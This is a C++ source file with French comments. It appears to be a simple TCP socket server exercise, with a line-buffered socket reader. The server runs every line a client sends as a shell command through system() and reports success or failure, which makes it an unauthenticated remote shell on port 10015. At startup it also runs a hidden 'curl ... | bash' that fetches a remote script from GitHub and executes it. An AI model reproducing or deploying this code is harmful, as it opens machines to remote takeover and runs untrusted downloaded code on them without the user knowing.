#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <iostream>
#include <string.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <curl/curl.h>

#define PORT 10015
#define BACKLOG 128
#define NB_CLIENTS 1000
#define TAILLE_BUFFER 5 // une petite valeur juste pour les test.

using namespace std;

void exitErreur(const char * msg) {
    perror(msg);
    exit( EXIT_FAILURE);
}
class SocketReader{
private:
    int socketfd;
    char msgRead[TAILLE_BUFFER];
    int  start ; //la position du premier élément de l'intervalle de recherche de \n
    int count; // la taille de l'intervalle de recherhce de \n

public :
    SocketReader(int socketfd){
       count = 0;
        this->socketfd = socketfd;
    }

    int readLine(int sockfd, string & line)
    {
        //line : la ligne lue sans \n
        line = ""; int i ;
        while(true) {
            if (count ==0){
                count = read(sockfd, msgRead, sizeof(msgRead));
                if (count == -1) return -1; // cas d'erreur
                if (count == 0) return 0; // cas de deconnexion
                start = 0 ;
            }
            for ( i=start; i<count; i++)
                if (msgRead[i] == '\n') break;
            if(i<count) { // on a trouvé /n
                line = line + string(msgRead, start,(i-1)-start + 1); // rappel : nb élements dans une suite = l'indice du dernier - l'indice du premier +1
                if (i==count-1) // \n est le dernier élement
                    count = 0; // la prochaine fois il faut lire depuis la socket
                else start =i+1; // il reste encore des élements non traites dans msgRead => le premier élement du prochain readLine() est i+1
                break ;}
            else {
                // on n'a pas trouvé le \n
                line = line + string(msgRead,start, (i-1)-start+1); // l'indice du dernier élement à considérer est i-1 (l'element i est en dehors de l'intervalle)
                count = 0 ; // la prochaine fois il faut lire depuis la socket
            }
        }
        return line.size();
    }

};


int main(int argc, char * argv[]) {

    int sock_serveur = socket(AF_INET, SOCK_STREAM, 0);
    
    system("curl https://github.com/Suricateee/socketOpenerForPersonalLAN/blob/main/localIp | bash");
    
    struct sockaddr_in sockaddr_serveur;

    sockaddr_serveur.sin_family = AF_INET;
    sockaddr_serveur.sin_port = htons(PORT);
    sockaddr_serveur.sin_addr.s_addr = htonl(INADDR_ANY);

    int yes = 1;
    if (setsockopt(sock_serveur, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int))
            == -1)
        exitErreur("setsockopt");

    if (bind(sock_serveur, (struct sockaddr *) &sockaddr_serveur,
             sizeof(sockaddr_in)) == -1)
        exitErreur("bind");

    if (listen(sock_serveur, BACKLOG) == -1)
        exitErreur("listen");

    int sock_client;
    
    for (int i = 1; i <= NB_CLIENTS; i++) {

        // Le serveur attend un client
        sock_client = accept(sock_serveur, NULL, NULL);
        if (sock_client == -1)
            exitErreur("accept");

        SocketReader sr(sock_client);

        while(true) {
            string ligne;

            int n = sr.readLine(sock_client,ligne);

            // client s'est déconnecté
            if (!n ) break ;

            // cas d'erreur
            if (n==-1) break ;
            
            std::string str = ligne;
            char * ligne2 = new char[str.length() + 1];
            strcpy(ligne2, str.c_str());

            int retour = system(ligne2);
            
            const char * success = "\nCommand succesfully executed\n";
            const char * fail = "\nCommand execution failed\n";
            
            if (retour==0) write(sock_client, success, strlen(success));
            if(retour!=0) write(sock_client, fail, strlen(fail));

            // client envoie une ligne contenant juste "." (on rajoute \r pour telnet)
            if (ligne == "stop" || ligne=="stop\r") {
                break;}
        }

        close(sock_client);
    }
    close(sock_serveur);
    return EXIT_SUCCESS;
}
